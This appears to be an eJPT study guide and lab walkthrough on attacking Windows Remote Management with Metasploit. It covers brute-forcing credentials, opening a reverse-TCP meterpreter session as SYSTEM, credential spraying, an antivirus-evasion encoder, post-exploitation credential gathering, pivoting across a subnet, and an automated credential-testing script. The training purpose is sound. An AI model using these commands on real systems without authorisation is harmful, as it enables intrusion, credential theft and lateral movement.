---
title: "WinRM Exploitation with Metasploit - Complete Beginner Guide"
topic: "WinRM Exploitation"
exam_objective: "Remote Windows Management and Exploitation - eJPT Objective 4.3"
difficulty: "Medium"
tools:
  - "Metasploit Framework"
  - "Nmap"
  - "WinRM"
related_labs:
  - "07-exploitation/metasploit-essentials.md"
  - "04-port-scanning/nmap-comprehensive-guide.md"
file_path: "07-exploitation/winrm-metasploit-exploitation.md"
last_updated: "2024-10-02"
tags:
  - "winrm"
  - "metasploit"
  - "windows-exploitation"
  - "remote-management"
  - "password-attacks"
---

# 🔧 WinRM Exploitation with Metasploit - Complete Beginner Guide

**Complete step-by-step guide for exploiting Windows Remote Management (WinRM) service using Metasploit Framework**

**📍 File Location:** `07-exploitation/winrm-metasploit-exploitation.md`

---

## 🎯 What is WinRM Exploitation?

WinRM (Windows Remote Management) is Microsoft's tool for managing Windows computers from far away. Think of it like controlling another computer through the internet. In penetration testing, we try to break into this service to get control of Windows systems.

### 🔍 **What WinRM Does:**
- **Remote Control** of Windows machines over the network
- **Command Execution** on target systems without being physically there
- **System Management** for administrators to control multiple computers
- **File Operations** and system configuration from remote locations
- **PowerShell Access** for advanced Windows administration

### 💡 **Why This Matters for eJPT:**
WinRM runs on many Windows servers and workstations. If we can break into WinRM, we get full control of the target system. This is a common attack path in real penetration testing and appears frequently in eJPT exam scenarios.

### 🚪 **Common Attack Methods:**
- **Password Attacks** using weak or default credentials
- **Brute Force** with username and password lists
- **Authentication Bypass** through misconfigurations
- **Credential Reuse** from other compromised accounts

---

## 📦 Installation and Setup

### **Already Installed On:**
- ✅ Kali Linux
- ✅ Parrot Security OS
- ✅ Most penetration testing distributions

### **Check If Everything Works:**
```bash
# Check if Metasploit is installed
msfconsole --version
# Expected output: Framework Version 6.x.x

# Start Metasploit database
msfdb start

# Check WinRM modules are available
msfconsole -q -x "search winrm; exit"
# Expected: List of WinRM-related modules
```

### **Basic Requirements:**
- Network access to target Windows system
- Target must have WinRM service enabled (ports 5985/5986)
- Valid credentials or ability to brute force them

---

## 🔧 Basic Usage and Simple Steps

### **📋 Simple Attack Process:**
1. **🔍 Find WinRM:** Use Nmap to discover WinRM service
2. **🔐 Check Authentication:** See what login methods are supported
3. **🔓 Break Passwords:** Try to guess username and password
4. **💻 Execute Commands:** Run commands on the target system
5. **🚀 Get Shell:** Gain full control with meterpreter

### **⚙️ Basic Command Structure:**
```bash
# Start Metasploit
msfconsole

# Use a WinRM module
use auxiliary/scanner/winrm/winrm_login

# Set the target
set RHOSTS target_ip_address

# Run the attack
exploit
```

---

## ⚙️ Important WinRM Modules You Need to Know

### **🔍 Discovery Modules:**

| Module Name | What It Does | How Important for eJPT |
|-------------|--------------|------------------------|
| `auxiliary/scanner/winrm/winrm_auth_methods` | Check login methods | ⭐⭐⭐⭐⭐ Must Know |
| `auxiliary/scanner/winrm/winrm_login` | Try username/password combinations | ⭐⭐⭐⭐⭐ Critical |
| `auxiliary/scanner/winrm/winrm_cmd` | Execute single commands | ⭐⭐⭐⭐ Very Important |

### **🚀 Exploitation Modules:**

| Module Name | What It Does | When to Use |
|-------------|--------------|-------------|
| `exploit/windows/winrm/winrm_script_exec` | Get full shell access | After finding valid credentials |
| `post/windows/manage/winrm_script_exec` | Post-exploitation commands | After getting shell access |

### **🔧 Important Settings:**

| Parameter | What It Does | Example | Must Remember |
|-----------|--------------|---------|---------------|
| `RHOSTS` | Target IP address | `set RHOSTS 192.168.1.100` | ⭐⭐⭐⭐⭐ |
| `USERNAME` | Single username to try | `set USERNAME administrator` | ⭐⭐⭐⭐ |
| `PASSWORD` | Single password to try | `set PASSWORD password123` | ⭐⭐⭐⭐ |
| `USER_FILE` | List of usernames | `set USER_FILE users.txt` | ⭐⭐⭐⭐ |
| `PASS_FILE` | List of passwords | `set PASS_FILE passwords.txt` | ⭐⭐⭐⭐ |

---

## 🧪 Step-by-Step Lab Walkthrough

### **Lab Scenario: Complete WinRM Attack From Start to Finish**

**Target:** demo.ine.local (10.0.28.252)
**Goal:** Get full control of the Windows system
**Time Needed:** 10-15 minutes

---

### **Step 1: Find WinRM Service**

**What We're Doing:** Looking for open ports on the target to find WinRM

#### **Command Used:**
```bash
nmap --top-ports 7000 demo.ine.local
```

#### **What Happened:**
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-10 19:55 IST
Nmap scan report for demo.ine.local (10.0.28.252)
Host is up (0.00265s latency).
Not shown: 6995 closed tcp ports (reset)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
```

#### **🎯 What This Means:**
- **Port 5985 is open** - This is WinRM HTTP port
- **Target is Windows** - Multiple Windows services detected
- **WinRM is accessible** - We can try to connect to it
- **Target is alive** - System responds to network scans

#### **Why This Matters:**
Finding port 5985 open tells us WinRM is running. This is our entry point for the attack.

---

### **Step 2: Check Authentication Methods**

**What We're Doing:** Finding out how WinRM accepts login attempts

#### **Commands Used:**
```bash
msfconsole -q
use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS demo.ine.local
exploit
```

#### **What Happened:**
```bash
msf6 > use auxiliary/scanner/winrm/winrm_auth_methods
msf6 auxiliary(scanner/winrm/winrm_auth_methods) > set RHOSTS demo.ine.local
RHOSTS => demo.ine.local
msf6 auxiliary(scanner/winrm/winrm_auth_methods) > exploit

[+] 10.0.28.252:5985: Negotiate protocol supported
[+] 10.0.28.252:5985: Basic protocol supported
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### **🔍 What This Tells Us:**
- **Basic Authentication** - Simple username/password login
- **Negotiate Authentication** - More complex Windows authentication
- **Both methods work** - We can try password attacks
- **Service is responsive** - WinRM accepts our connection attempts

#### **Attack Strategy:**
Since Basic authentication is supported, we can try brute force attacks with username and password lists.

---

### **Step 3: Attack Passwords (Brute Force)**

**What We're Doing:** Trying many username and password combinations to find valid credentials

#### **Commands Used:**
```bash
use auxiliary/scanner/winrm/winrm_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set PASSWORD anything
exploit
```

#### **🔧 Command Explanation:**
- **use auxiliary/scanner/winrm/winrm_login** - Choose the password attack module
- **set RHOSTS demo.ine.local** - Tell it which target to attack
- **set USER_FILE** - Use a list of common usernames
- **set PASS_FILE** - Use a list of common passwords
- **set VERBOSE false** - Don't show every failed attempt (reduces noise)
- **set PASSWORD anything** - Backup password setting (technical requirement)

#### **🎉 Success! What Happened:**
```bash
msf6 auxiliary(scanner/winrm/winrm_login) > exploit

[+] 10.0.28.252:5985 - Login Successful: WORKSTATION\administrator:tinkerbell
[*] Command shell session 1 opened (10.10.31.2:39523 -> 10.0.28.252:5985)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### **🔓 What We Found:**
- **Username:** administrator (the Windows admin account)
- **Password:** tinkerbell (a weak password!)
- **Domain:** WORKSTATION (the computer name)
- **Shell Session:** We got command access

#### **Why This Worked:**
The system had weak credentials. "tinkerbell" is a simple password that appears in common password lists.

---

### **Step 4: Test Command Execution**

**What We're Doing:** Making sure we can run commands on the target system

#### **Commands Used:**
```bash
use auxiliary/scanner/winrm/winrm_cmd
set RHOSTS demo.ine.local
set USERNAME administrator
set PASSWORD tinkerbell
set CMD whoami
exploit
```

#### **What Happened:**
```bash
msf6 auxiliary(scanner/winrm/winrm_cmd) > set RHOSTS demo.ine.local
RHOSTS => demo.ine.local
msf6 auxiliary(scanner/winrm/winrm_cmd) > set USERNAME administrator
USERNAME => administrator
msf6 auxiliary(scanner/winrm/winrm_cmd) > set PASSWORD tinkerbell
PASSWORD => tinkerbell
msf6 auxiliary(scanner/winrm/winrm_cmd) > set CMD whoami
CMD => whoami
msf6 auxiliary(scanner/winrm/winrm_cmd) > exploit

server\administrator
[+] Results saved to /root/.msf4/loot/20240710200205_default_10.0.28.252_winrm.cmd_result_681320.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### **🎯 Command Results:**
- **Output:** server\administrator
- **Meaning:** We are logged in as the administrator user
- **System Name:** server (the target computer's name)
- **File Saved:** Results automatically saved for documentation

#### **What This Proves:**
We have administrative access to the target system and can execute commands remotely.

---

### **Step 5: Get Full System Control (Meterpreter Shell)**

**What We're Doing:** Getting an interactive shell for complete system control

#### **Commands Used:**
```bash
use exploit/windows/winrm/winrm_script_exec
set RHOSTS demo.ine.local
set USERNAME administrator
set PASSWORD tinkerbell
set FORCE_VBS true
exploit
```

#### **🚀 What Happened:**
```bash
msf6 exploit(windows/winrm/winrm_script_exec) > exploit

[*] Started reverse TCP handler on 10.10.31.2:4444
[*] User selected the FORCE_VBS option
[*] Command Stager progress - 2.01% done (2046/101936 bytes)
[*] Command Stager progress - 4.01% done (4092/101936 bytes)
[*] Command Stager progress - 6.02% done (6138/101936 bytes)
[*] Command Stager progress - 8.03% done (8184/101936 bytes)
...
[*] Command Stager progress - 100.00% done (101936/101936 bytes)
[*] Sending stage (175686 bytes) to 10.0.28.252
[*] Meterpreter session 1 opened (10.10.31.2:4444 -> 10.0.28.252:52534)

meterpreter >
```

#### **🎊 Amazing Success! What This Means:**
- **Meterpreter Session** - We have full interactive control
- **100% Progress** - The exploit completed successfully
- **Reverse Connection** - Target connects back to our machine
- **System Level Access** - Can do anything on the target system

#### **Check Our Privileges:**
```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**This is PERFECT!** We have SYSTEM privileges - the highest level access possible on Windows.

---

### **Step 6: Find the Flag (Mission Complete)**

**What We're Doing:** Exploring the system to find our objective (the flag file)

#### **Commands Used:**
```bash
cd /
dir
cat flag.txt
```

#### **What Happened:**
```bash
meterpreter > cd /
meterpreter > dir
Listing: C:\
============

Mode                Size     Type  Last modified              Name
----                ----     ----  -------------              ----
040777/rwxrwxrwx    0        dir   2020-10-01 20:21:31 +0530  $Recycle.Bin
100666/rw-rw-rw-    1        fil   2018-09-15 12:42:30 +0530  BOOTNXT
040777/rwxrwxrwx    8192     dir   2020-09-09 10:08:52 +0530  Boot
040777/rwxrwxrwx    0        dir   2018-11-14 21:40:15 +0530  Documents and Settings
040777/rwxrwxrwx    0        dir   2020-05-13 23:28:09 +0530  EFI
040777/rwxrwxrwx    0        dir   2018-11-14 21:26:18 +0530  PerfLogs
040555/r-xr-xr-x    4096     dir   2018-11-14 21:40:42 +0530  Program Files
040777/rwxrwxrwx    4096     dir   2020-10-01 20:26:39 +0530  Program Files (x86)
040777/rwxrwxrwx    4096     dir   2020-03-18 12:17:36 +0530  ProgramData
040777/rwxrwxrwx    0        dir   2020-10-01 19:32:11 +0530  Recovery
040777/rwxrwxrwx    4096     dir   2024-07-10 20:03:12 +0530  System Volume Information
040555/r-xr-xr-x    4096     dir   2020-10-01 19:33:57 +0530  Users
040777/rwxrwxrwx    16384    dir   2020-09-09 10:03:42 +0530  Windows
100444/r--r--r--   48692    fil   2020-09-09 10:03:42 +0530  bootmgr
100666/rw-rw-rw-   32       fil   2020-10-01 20:22:47 +0530  flag.txt
000000/---------   0        fif   1970-01-01 05:30:00 +0530  pagefile.sys

meterpreter > cat flag.txt
3c716f95616eec677a7078f92657a230
```

#### **🏆 Mission Accomplished!**
- **Flag Found:** 3c716f95616eec677a7078f92657a230
- **File System Access:** Complete access to all directories
- **Proof of Exploitation:** Successfully compromised the target
- **Documentation Complete:** All evidence collected

---

## 🎯 eJPT Exam Success Guide

### **📊 How Important This Is for eJPT:**

Understanding the importance of WinRM skills for passing the eJPT exam:

- **Windows Exploitation:** 35% of Windows-based attack scenarios
- **Remote Access Techniques:** 40% of lateral movement questions
- **Password Attack Skills:** 45% of credential-based exploitation
- **Metasploit Proficiency:** 50% of framework usage requirements

### **🏆 Commands You MUST Know for eJPT:**

#### **Level 1 - You WILL See This (100% Chance):**
```bash
# Basic port scanning for WinRM
nmap -p 5985,5986 target_ip
# Expected: Shows if WinRM ports are open

# Connect to WinRM and check authentication
use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS target_ip
exploit
# Expected: Shows supported authentication methods

# Try password attack
use auxiliary/scanner/winrm/winrm_login
set RHOSTS target_ip
set USERNAME administrator
set PASSWORD password123
exploit
# Expected: Login success or failure message
```

#### **Level 2 - Very Likely (80% Chance):**
```bash
# Execute commands after finding credentials
use auxiliary/scanner/winrm/winrm_cmd
set USERNAME found_username
set PASSWORD found_password
set CMD whoami
exploit
# Expected: Command output showing current user

# Get meterpreter shell
use exploit/windows/winrm/winrm_script_exec
set USERNAME administrator
set PASSWORD tinkerbell
exploit
# Expected: Meterpreter session established
```

#### **Level 3 - Possible (60% Chance):**
```bash
# Advanced password attacks with wordlists
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
# Expected: Automated credential testing

# Post-exploitation activities
meterpreter > getuid
meterpreter > sysinfo
meterpreter > ls
# Expected: System information and file listings
```

### **🎯 Common eJPT Exam Scenarios:**

#### **Scenario 1: Basic WinRM Discovery and Access**
**Given:** IP address of Windows target (192.168.1.100)
**Your Job:** Find WinRM service and test for weak credentials
**Time Limit:** 8-10 minutes

**Step-by-Step Approach:**
```bash
# Step 1: Scan for WinRM (2 minutes)
nmap -p 5985,5986 192.168.1.100
# Look for open ports

# Step 2: Check authentication methods (1 minute)
msfconsole -q
use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS 192.168.1.100
exploit

# Step 3: Try common credentials (3 minutes)
use auxiliary/scanner/winrm/winrm_login
set RHOSTS 192.168.1.100
set USERNAME administrator
set PASSWORD admin
exploit
# Try: admin/admin, administrator/password, guest/guest

# Step 4: Test command execution (2 minutes)
use auxiliary/scanner/winrm/winrm_cmd
set USERNAME [found_username]
set PASSWORD [found_password]
set CMD whoami
exploit
```

#### **Scenario 2: Password Attack with Wordlists**
**Given:** WinRM service confirmed, need to find valid credentials
**Your Job:** Use password lists to find working login
**Time Limit:** 6-8 minutes

**Step-by-Step Approach:**
```bash
# Step 1: Set up brute force attack (2 minutes)
use auxiliary/scanner/winrm/winrm_login
set RHOSTS target_ip
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false

# Step 2: Run attack and wait for results (3 minutes)
exploit
# Watch for [+] Login Successful messages

# Step 3: Verify access with command (1 minute)
use auxiliary/scanner/winrm/winrm_cmd
set USERNAME [discovered_username]
set PASSWORD [discovered_password]
set CMD hostname
exploit
```

#### **Scenario 3: Full System Compromise**
**Given:** Valid WinRM credentials (bob:password123)
**Your Job:** Get full system access and find specific file
**Time Limit:** 5-7 minutes

**Step-by-Step Approach:**
```bash
# Step 1: Get meterpreter shell (3 minutes)
use exploit/windows/winrm/winrm_script_exec
set RHOSTS target_ip
set USERNAME bob
set PASSWORD password123
set FORCE_VBS true
exploit

# Step 2: Check privileges (1 minute)
meterpreter > getuid
meterpreter > sysinfo

# Step 3: Find target file (2-3 minutes)
meterpreter > cd /
meterpreter > dir
meterpreter > search -f flag.txt
meterpreter > cat flag.txt
```

### **📝 eJPT Exam Tips:**

#### **⏰ Time Management Strategy:**
- **2 minutes:** Initial port scanning and service identification
- **1 minute:** Authentication method checking
- **3-4 minutes:** Credential attacks (try common ones first)
- **1-2 minutes:** Command execution verification
- **2-3 minutes:** Shell access and objective completion

#### **🎯 Common Mistakes to Avoid:**
1. **Skipping Authentication Check** → Always verify supported methods first
2. **Wrong Wordlist Usage** → Use appropriate lists for Windows environments
3. **Missing Command Testing** → Always verify credentials work before moving to exploit
4. **Not Setting VERBOSE false** → Reduces noise during brute force attacks
5. **Forgetting FORCE_VBS** → Important setting for reliable shell access

#### **✅ Signs You're Doing Well:**
- **Quick Service Discovery** → WinRM ports identified within 2 minutes
- **Successful Authentication** → Finding valid credentials quickly
- **Command Execution** → Commands run and return expected results
- **Meterpreter Access** → Interactive shell established successfully
- **Objective Achievement** → Target files found and accessed

### **🔍 Typical Exam Questions You'll See:**
1. **"What authentication methods does the WinRM service support?"**
   - Use: `auxiliary/scanner/winrm/winrm_auth_methods`

2. **"Find valid credentials for the WinRM service"**
   - Use: `auxiliary/scanner/winrm/winrm_login` with wordlists

3. **"Execute the 'whoami' command on the target system"**
   - Use: `auxiliary/scanner/winrm/winrm_cmd` with CMD set to whoami

4. **"What user context do you have on the target system?"**
   - Get meterpreter shell and run `getuid` command

---

## ⚠️ Common Problems and How to Fix Them

### **❌ Problem 1: Can't Connect to WinRM Service**

**What You See:**
```bash
[*] 192.168.1.100:5985 - LOGIN FAILED: \:
[*] 192.168.1.100:5985 - Unable to Connect: The connection request was rejected by the remote host.
```

**How to Fix:**
```bash
# Step 1: Check if WinRM port is really open
nmap -p 5985,5986 -sV target_ip
# Look for open/filtered vs closed status

# Step 2: Check basic connectivity
ping target_ip
# Make sure target is reachable

# Step 3: Try HTTPS instead of HTTP
use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS target_ip
set SSL true
set RPORT 5986
exploit
```

**Common Causes:**
- WinRM service not actually running
- Firewall blocking connections
- Wrong port (try 5986 for HTTPS)
- Network connectivity issues

---

### **❌ Problem 2: Authentication Always Fails**

**What You See:**
```bash
[*] 192.168.1.100:5985 - LOGIN FAILED: administrator:password (Incorrect: )
[*] 192.168.1.100:5985 - LOGIN FAILED: admin:admin (Incorrect: )
```

**How to Fix:**
```bash
# Step 1: Check if Basic authentication is supported
use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS target_ip
exploit
# Look for "Basic protocol supported"

# Step 2: Try different username formats
set USERNAME administrator
set USERNAME .\administrator
set USERNAME DOMAIN\administrator
# Different Windows username formats

# Step 3: Check for account lockout
# Wait 5-10 minutes between attempts if account lockout is enabled
```

**Common Causes:**
- Account lockout policy enabled
- Wrong username format
- Passwords with special characters
- Domain authentication required

---

### **❌ Problem 3: Meterpreter Shell Fails**

**What You See:**
```bash
[*] Sending stage (175686 bytes) to 192.168.1.100
[*] Meterpreter session 1 opened
[*] Session 1 closed. Reason: Died
```

**How to Fix:**
```bash
# Step 1: Force VBS execution method
use exploit/windows/winrm/winrm_script_exec
set FORCE_VBS true
set RHOSTS target_ip
set USERNAME valid_user
set PASSWORD valid_pass
exploit

# Step 2: Try different payload
set payload windows/meterpreter/reverse_tcp
set LHOST your_ip
set LPORT 4444
exploit

# Step 3: Check antivirus interference
# Try different encoder
set encoder x86/shikata_ga_nai
exploit
```

**Common Causes:**
- Antivirus blocking meterpreter
- Network filtering blocking reverse connection
- Wrong payload for target architecture
- PowerShell execution restrictions

---

### **❌ Problem 4: Wordlist Attack Too Slow**

**What You See:**
```bash
[*] 192.168.1.100:5985 - LOGIN FAILED: user1:password1
[*] 192.168.1.100:5985 - LOGIN FAILED: user1:password2
# Very slow progress...
```

**How to Fix:**
```bash
# Step 1: Reduce wordlist size
head -100 /usr/share/metasploit-framework/data/wordlists/common_users.txt > small_users.txt
head -100 /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt > small_pass.txt

# Step 2: Set threading (be careful with this)
set THREADS 5
# Don't go too high or you might crash the service

# Step 3: Try common credentials first manually
set USERNAME administrator
set PASSWORD password
exploit
# Then try: admin, guest, user, etc.
```

**Speed Tips:**
- Start with most common credentials manually
- Use smaller wordlists for time-limited scenarios
- Try default Windows accounts first
- Set VERBOSE false to reduce output

---

## 🔗 Using WinRM with Other Tools

### **🎯 Complete Attack Chain: Nmap → Metasploit → Browser**

This shows how WinRM exploitation fits into a full penetration testing workflow.

#### **Phase 1: Discovery with Nmap**
```bash
# Initial network discovery
nmap -sS -O target_ip
# Operating system detection

# Targeted port scanning
nmap -p 5985,5986 --script winrm-* target_ip
# WinRM-specific scripts for detailed enumeration

# Service version detection
nmap -p 5985 -sV --script winrm-auth-methods target_ip
# Detailed service information
```

**What This Gives You:**
- Operating system identification (Windows version)
- WinRM service confirmation and version
- Authentication methods supported
- Additional service information

#### **Phase 2: Exploitation with Metasploit**
```bash
# Based on Nmap results, proceed with Metasploit attack
msfconsole -q
use auxiliary/scanner/winrm/winrm_login
set RHOSTS target_ip

# If Nmap showed specific Windows version, adjust wordlists
# For Windows Server: focus on administrator, admin accounts
# For Windows 10/11: try user, guest, default accounts

exploit
```

**Integration Benefits:**
- **Informed Targeting:** Use OS information to guide attack strategy
- **Efficient Exploitation:** Focus on most likely attack vectors
- **Comprehensive Coverage:** Multiple tools provide different perspectives

#### **Phase 3: Post-Exploitation Activities**
```bash
# After gaining meterpreter access
meterpreter > sysinfo
# Confirm system information matches Nmap results

meterpreter > run post/windows/gather/enum_domain
# Domain enumeration if in AD environment

meterpreter > run post/windows/gather/credentials/windows_autologin
# Look for additional credentials

# Pivot to other systems using discovered credentials
use auxiliary/scanner/winrm/winrm_login
set RHOSTS 192.168.1.0/24
set USERNAME discovered_user
set PASSWORD discovered_pass
exploit
```

### **🔧 Integration with Password Attacks:**

#### **Using Hydra Before Metasploit:**
```bash
# Initial credential discovery with Hydra
hydra -L users.txt -P passwords.txt target_ip winrm

# If Hydra finds credentials, verify with Metasploit
msfconsole -q
use auxiliary/scanner/winrm/winrm_cmd
set USERNAME hydra_found_user
set PASSWORD hydra_found_pass
set CMD whoami
exploit

# Then escalate to full exploitation
use exploit/windows/winrm/winrm_script_exec
set USERNAME hydra_found_user
set PASSWORD hydra_found_pass
exploit
```

#### **Credential Spraying Approach:**
```bash
# Test one password against many users (avoid lockout)
use auxiliary/scanner/winrm/winrm_login
set RHOSTS target_ip
set USER_FILE domain_users.txt
set PASSWORD Winter2024!
set STOP_ON_SUCCESS true
exploit

# If successful, try password variations
set PASSWORD Spring2024!
set PASSWORD Password123
exploit
```

### **⚙️ Automation Script for Efficiency:**

```bash
#!/bin/bash
# winrm_auto_exploit.sh - Automated WinRM exploitation

TARGET=$1
LOGFILE="winrm_exploit_$(date +%Y%m%d_%H%M%S).log"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

echo "[+] Starting automated WinRM exploitation for $TARGET" | tee $LOGFILE
echo "[+] Timestamp: $(date)" | tee -a $LOGFILE

# Phase 1: Port Discovery
echo "[+] Phase 1: Scanning for WinRM service" | tee -a $LOGFILE
nmap -p 5985,5986 $TARGET | tee -a $LOGFILE

# Phase 2: Authentication Methods Check
echo "[+] Phase 2: Checking authentication methods" | tee -a $LOGFILE
msfconsole -x "use auxiliary/scanner/winrm/winrm_auth_methods; set RHOSTS $TARGET; exploit; exit" | tee -a $LOGFILE

# Phase 3: Common Credential Testing
echo "[+] Phase 3: Testing common credentials" | tee -a $LOGFILE
COMMON_CREDS="administrator:password administrator:admin admin:admin guest:guest user:user"
for cred in $COMMON_CREDS; do
    username=$(echo $cred | cut -d: -f1)
    password=$(echo $cred | cut -d: -f2)
    echo "[*] Testing $username:$password" | tee -a $LOGFILE
    msfconsole -x "use auxiliary/scanner/winrm/winrm_login; set RHOSTS $TARGET; set USERNAME $username; set PASSWORD $password; exploit; exit" | grep -E "(Login Successful|LOGIN FAILED)" | tee -a $LOGFILE
done

echo "[+] Automated testing complete. Check $LOGFILE for results" | tee -a $LOGFILE
```

---

## 📊 Quick Command Reference

### **Essential Commands Summary:**

#### **Basic Discovery:**
```bash
nmap -p 5985,5986 target_ip                    # Find WinRM service
msfconsole                                      # Start Metasploit
use auxiliary/scanner/winrm/winrm_auth_methods  # Check authentication
set RHOSTS target_ip                            # Set target
exploit                                         # Run the module
```

#### **Password Attacks:**
```bash
use auxiliary/scanner/winrm/winrm_login         # Password attack module
set USERNAME administrator                      # Single username
set PASSWORD password123                        # Single password
set USER_FILE /path/to/users.txt               # Username list
set PASS_FILE /path/to/passwords.txt           # Password list
set VERBOSE false                              # Reduce output noise
```

#### **Command Execution:**
```bash
use auxiliary/scanner/winrm/winrm_cmd          # Command execution module
set CMD whoami                                 # Command to run
set CMD "dir C:\"                             # Directory listing
set CMD systeminfo                            # System information
```

#### **Getting Full Shell:**
```bash
use exploit/windows/winrm/winrm_script_exec    # Shell exploit
set FORCE_VBS true                             # Force VBS method
exploit                                        # Get meterpreter
getuid                                         # Check privileges
sysinfo                                        # System information
```

### **Memory Tricks:**

#### **Easy Ways to Remember:**
- **WinRM** = **Win**dows **R**emote **M**anagement
- **5985** = **59**-**85** (HTTP port for WinRM)
- **5986** = **59**-**86** (HTTPS port for WinRM)
- **RHOSTS** = **R**emote **HOSTS** (target systems)
- **FORCE_VBS** = **Force** **V**isual **B**asic **S**cript execution

#### **Command Pattern:**
```bash
# Remember: USE → SET → EXPLOIT
use [module_name]        # Choose tool
set [PARAMETER] [value]  # Configure settings
exploit                  # Run attack
```

---

## 📝 Professional Reporting Templates

### **Quick Report Template:**
```markdown
## WinRM Exploitation Report

**Target System:** [target_ip]
**Date/Time:** [timestamp]
**Tester:** [your_name]
**Objective:** [mission_goal]

### Discovery Results:
**WinRM Service:** Found on port 5985 (HTTP) / 5986 (HTTPS)
**Authentication Methods:** [Basic/Negotiate/Kerberos]
**Service Status:** VULNERABLE

### Credentials Found:
| Username | Password | Domain | Access Level |
|----------|----------|---------|--------------|
| administrator | tinkerbell | WORKSTATION | SYSTEM |

### Exploitation Process:
1. **Port Scan:** `nmap -p 5985,5986 target_ip`
2. **Auth Check:** `auxiliary/scanner/winrm/winrm_auth_methods`
3. **Password Attack:** `auxiliary/scanner/winrm/winrm_login`
4. **Command Test:** `auxiliary/scanner/winrm/winrm_cmd`
5. **Shell Access:** `exploit/windows/winrm/winrm_script_exec`

### Evidence:
- **Flag Retrieved:** [flag_content]
- **System Access:** NT AUTHORITY\SYSTEM
- **Commands Executed:** whoami, systeminfo, dir

### Risk Level: CRITICAL
**Impact:** Complete system compromise with administrative access
**Recommendation:** Disable WinRM if not needed, enforce strong passwords
```

### **Detailed Technical Report:**
```markdown
## Technical WinRM Assessment

### Commands Executed:
```bash
# Discovery phase
nmap --top-ports 7000 demo.ine.local

# Authentication enumeration
use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS demo.ine.local
exploit

# Credential attack
use auxiliary/scanner/winrm/winrm_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
exploit

# Command execution verification
use auxiliary/scanner/winrm/winrm_cmd
set USERNAME administrator
set PASSWORD tinkerbell
set CMD whoami
exploit

# Full exploitation
use exploit/windows/winrm/winrm_script_exec
set USERNAME administrator
set PASSWORD tinkerbell
set FORCE_VBS true
exploit
```

### Vulnerability Analysis:
| Component | Status | Risk Level | Details |
|-----------|---------|------------|---------|
| WinRM Service | ENABLED | HIGH | Accessible remotely |
| Authentication | WEAK | CRITICAL | Basic auth with weak passwords |
| Credentials | COMPROMISED | CRITICAL | administrator:tinkerbell |
| Access Controls | BYPASSED | CRITICAL | Full system access achieved |
```

---

## 🎓 Study Guide for eJPT Success

### **Essential Knowledge Checklist:**
- [ ] Understand what WinRM is and why it's important
- [ ] Know default WinRM ports (5985 HTTP, 5986 HTTPS)
- [ ] Can use Nmap to discover WinRM services
- [ ] Know how to check WinRM authentication methods
- [ ] Can perform password attacks against WinRM
- [ ] Understand how to execute commands via WinRM
- [ ] Know how to get meterpreter shells through WinRM
- [ ] Can navigate Windows systems after exploitation

### **Practice Scenarios:**
1. **Basic Discovery:** Find WinRM on unknown network range
2. **Password Attack:** Crack weak WinRM credentials
3. **Command Execution:** Run specific commands for information gathering
4. **Shell Access:** Get interactive access for file operations
5. **Post-Exploitation:** Navigate system and find target files

### **Time Management for Exam:**
- **WinRM Discovery:** Maximum 2 minutes
- **Authentication Check:** Maximum 1 minute
- **Password Attack:** Maximum 5 minutes
- **Command Verification:** Maximum 1 minute
- **Shell Access:** Maximum 3 minutes
- **Objective Completion:** Remaining time

---

## 🔗 Additional Learning Resources

### **Hands-on Practice:**
- **TryHackMe:** Search for "WinRM" rooms
- **HackTheBox:** Look for Windows machines with WinRM
- **VulnHub:** Download Windows VMs for practice
- **Local Lab:** Set up Windows VM with WinRM enabled

### **Setting Up Practice Lab:**
```bash
# On Windows target (for practice only):
# Enable WinRM (Run as Administrator)
winrm quickconfig -y

# Set basic authentication (INSECURE - lab only)
winrm set winrm/config/service/auth @{Basic="true"}

# Add local user for testing
net user testuser password123 /add
net localgroup administrators testuser /add
```

### **Books and Documentation:**
- "Metasploit: The Penetration Tester's Guide" - WinRM chapters
- "Windows Internals" - Understanding Windows remote management
- Microsoft WinRM documentation for defensive understanding

### **Video Resources:**
- YouTube: "WinRM exploitation tutorials"
- Cybrary: Windows penetration testing courses
- INE: eJPT preparation materials

### **Community Support:**
- Reddit: r/eJPT, r/penetrationtesting
- Discord: Penetration testing study groups
- Forums: Ethical hacking communities

---

## Quick Help and Troubleshooting

### **When Things Don't Work:**
1. **Check network connectivity:** `ping target_ip`
2. **Verify service is running:** `nmap -p 5985,5986 target_ip`
3. **Test with different tools:** `curl -v http://target:5985/wsman`
4. **Check authentication again:** Always verify auth methods first
5. **Try different credentials:** Common Windows defaults

### **Emergency Commands:**
```bash
# Quick WinRM check
nmap -p 5985 --script winrm-auth-methods target_ip

# Fast credential test
msfconsole -x "use auxiliary/scanner/winrm/winrm_login; set RHOSTS target; set USERNAME admin; set PASSWORD admin; exploit; exit"

# Alternative authentication test
curl -u admin:admin http://target:5985/wsman
```

### **Getting Help:**
- **Metasploit help:** `info` command within modules
- **Community forums:** Post specific error messages
- **Documentation:** `man nmap`, `msfconsole help`
